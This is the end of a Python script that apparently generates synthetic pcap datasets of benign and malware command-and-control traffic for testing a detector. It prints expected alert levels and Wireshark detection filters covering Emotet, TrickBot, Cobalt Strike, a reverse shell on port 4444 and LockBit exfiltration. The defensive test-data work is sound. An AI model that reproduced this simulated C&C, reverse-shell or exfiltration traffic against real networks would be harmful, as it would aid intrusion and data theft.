    t += 30
    all_pkts += gen_blackmatter_lateral(bot, blackmatter_cnc, t)

    all_pkts.sort(key=lambda p: float(p.time))
    wrpcap(out_path, all_pkts)
    print(f"    [OK] Saved: {out_path}  ({len(all_pkts)} packets)")
    return len(all_pkts)


# ═══════════════════════════════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════════════════════════════
if __name__ == "__main__":
    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "dataset", "sample_pcap")
    os.makedirs(out_dir, exist_ok=True)

    benign_path = os.path.join(out_dir, "benign_traffic.pcap")
    cnc_path    = os.path.join(out_dir, "cnc_traffic.pcap")

    n_b = build_benign_pcap(benign_path, n_flows=35)
    n_c = build_cnc_pcap(cnc_path)

    print()
    print("=" * 68)
    print("  DONE")
    print("=" * 68)
    print(f"  benign_traffic.pcap : {n_b:>4} packets -> {benign_path}")
    print(f"  cnc_traffic.pcap    : {n_c:>4} packets -> {cnc_path}")
    print()
    print("  Expected alert levels in detector:")
    print("  Stage 2 – Emotet beacon    -> CRITICAL (ThreatIntel=95 + beacon + known domain)")
    print("  Stage 3 – TrickBot beacon  -> CRITICAL (ThreatIntel=88 + DGA domain)")
    print("  Stage 4 – CobaltStrike     -> CRITICAL (ThreatIntel=90 + DGA domain)")
    print("  Stage 5 – Reverse shell    -> HIGH/CRITICAL (port 4444 + ThreatIntel=92)")
    print("  Stage 6 – LockBit exfil   -> CRITICAL (ThreatIntel=93 + known domain)")
    print()
    print("  Wireshark filters:")
    print("    ip.addr == 45.142.212.100  -> Emotet C&C")
    print("    ip.addr == 185.220.101.34  -> TrickBot C&C")
    print("    ip.addr == 194.165.16.10   -> Cobalt Strike")
    print("    ip.addr == 91.219.236.166  -> QakBot reverse shell")
    print("    tcp.port == 4444           -> Reverse shell channel")
    print("    dns.qry.name contains \"bot-controller\" -> DNS tunnel")
    print("=" * 68)
